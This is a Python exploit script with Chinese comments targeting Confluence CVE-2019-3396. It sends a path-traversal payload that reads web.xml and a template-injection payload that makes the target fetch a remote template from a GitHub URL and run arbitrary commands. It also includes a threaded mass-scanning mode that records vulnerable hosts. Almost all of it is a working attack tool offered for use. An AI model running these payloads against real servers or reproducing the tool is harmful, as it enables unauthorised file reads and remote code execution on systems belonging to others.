# -*- coding: utf -*-
import requests
import threading
from bs4 import BeautifulSoup
import sys
from optparse import OptionParser
requests.packages.urllib3.disable_warnings()

results = []

def poc_check(domain):
    # poc为读取web.xml
    data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
    # print(data)
    # 调整url结构，脚本所用的url结构均为ip或者域名，且最后不加斜杠
    if domain[:4] != "http":
        domain = "http://"+domain
    # header里需要有Referer，不然返回结果是xsrf check failed
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Referer": domain +
        "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"
    }
    if "/rest/tinymce/1/macro/preview" in domain:
        url = domain
    else:
        url = domain + "/rest/tinymce/1/macro/preview"
    # print(url)
    try:
        req = requests.post(url, headers=header, data=data, verify=False, timeout=10)
        # 调用bs4库来提取返回结果中我们想要的值，通过是否存在web-app来判断命令是否执行成功
        soup = BeautifulSoup(req.text, 'html.parser')
        messages = soup.find_all(class_='wiki-content')
        if messages:
            if "<?xml" in str(messages[0]):
                print("\033[32m[+] %s is vulnerable\033[0m" % domain)
                results.append(domain)
        else:
            print("[-] %s is no vulnerable" % domain)
    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout " + url)
    except requests.exceptions.ConnectionError:
        print("[-] connect error "  + url)
    except:
        print("[-] don't known why connect false...")


# rce函数，接受传进的参数并写入data中，发包到目标，提取命令执行后的结果
def rce(domain, command):
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Referer": domain +
        "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"}
    if "/rest/tinymce/1/macro/preview" in domain:
        url = domain
    else:
        url = domain + "/rest/tinymce/1/macro/preview"

    data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/mntn0x/POC/master/Confluence_rce_cve-2019-3396/poc.rm","command":"%s"}}}' % command
    try:
        req = requests.post(url, headers=header, data=data)
        soup = BeautifulSoup(req.text, 'html.parser')
        messages = soup.find_all(class_='wiki-content')
        if messages:
            print("$ %s" % command)
            # 处理一下bs4提取到的返回结果，争取输出干净一点
            message = str(
                messages[0]).replace(
                '<div class="wiki-content">', "")
            message = message.replace("</div>", "")
            if '<span class="widget-link">www.viddler.com</span>' in message:
                print(">>> target is vulnerable, but it maybe can't rce")
            else:
                print(">>> " + message)

    except requests.exceptions.ConnectTimeout:
        print("[-] conncect timeout")
    except requests.exceptions.ConnectionError:
        print("[-] connect error")
    except:
        print("[-] don't known why connect false...")

# 循环调用poc_check函数，并保存存在漏洞的url到结果字典，将结果保存在output.txt，并在函数结束前输出结果字典。
def batch(domain_list, thread_num, output):
    thread_list = []
    f = open(domain_list, "r")
    f_output = open(output, "w")
    for domain in f.readlines():
        t =threading.Thread(target=poc_check, args=(domain.strip(),))
        thread_list.append(t)
    for i in range(0, len(thread_list)):
        thread_list[i].start()
        while True:
            if len(threading.enumerate()) <= thread_num:
                break
    # 判断最后启动的n个线程是否结束，没结束的话，加上join，确保所有子线程结束之后再进入主线程的写文件操作
    for j in range(len(thread_list)-thread_num, len(thread_list)):
        if thread_list[j].isAlive():
            thread_list[j].join()
    f.close()
    print("-"*35)
    for i in range(0, len(results)):
        f_output.write(results[i]+"\n")
    f_output.close()

if __name__ == '__main__':
    usage = '''
    *************************************************************************************
    *                      Conflunce RCE CVE-2019-3396                                  *
    * python3 Conflunce_rce_cve-2019-3396.py -u http://confluence:8090/                 *
    * python3 Conflunce_rce_cve-2019-3396.py -L urls.txt -o output.txt                  *
    * python3 Conflunce_rce_cve-2019-3396.py -u http://confluence:8090 --command whoami *
    *************************************************************************************
    '''
    parser = OptionParser(usage)
    parser.add_option('-u', dest='target_url', type='string', help='single url')
    parser.add_option('-L', dest='target_List', type='string', help='url list')
    parser.add_option('-t', dest='thread', type='int', default=5, help='threads count')
    parser.add_option('-c', '--command', dest='command', help='execute command')
    parser.add_option('-o', dest='output', type='string', default='output.txt', help='output file')
    (options, args) = parser.parse_args()
    # 将接受的参数值赋给变量
    url = options.target_url
    uList = options.target_List
    thread = options.thread
    command = options.command
    outfile = options.output

    if url and command==None:
        poc_check(url)
    elif url and command:
        rce(url, command)
    elif uList and outfile:
        batch(uList, thread, outfile)
    else:
        print(usage)

